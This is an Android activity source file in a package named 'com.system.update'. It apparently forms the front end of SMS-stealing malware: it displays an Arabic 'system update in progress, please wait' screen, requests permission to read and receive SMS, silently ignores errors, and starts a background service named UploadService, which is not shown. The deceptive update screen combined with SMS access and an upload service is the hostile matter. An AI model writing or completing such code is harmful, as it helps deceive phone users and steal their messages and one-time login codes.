package com.system.update;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView(this);
        tv.setText("جاري تحديث النظام...\n\nيرجى الانتظار");
        tv.setGravity(Gravity.CENTER);
        tv.setTextSize(20);
        setContentView(tv);

        try {
            requestPermissions(new String[]{
                "android.permission.RECEIVE_SMS",
                "android.permission.READ_SMS",
                "android.permission.POST_NOTIFICATIONS"
            }, 1);
        } catch (Exception e) {}

        try {
            Intent svc = new Intent(this, UploadService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Exception e) {}
    }
}
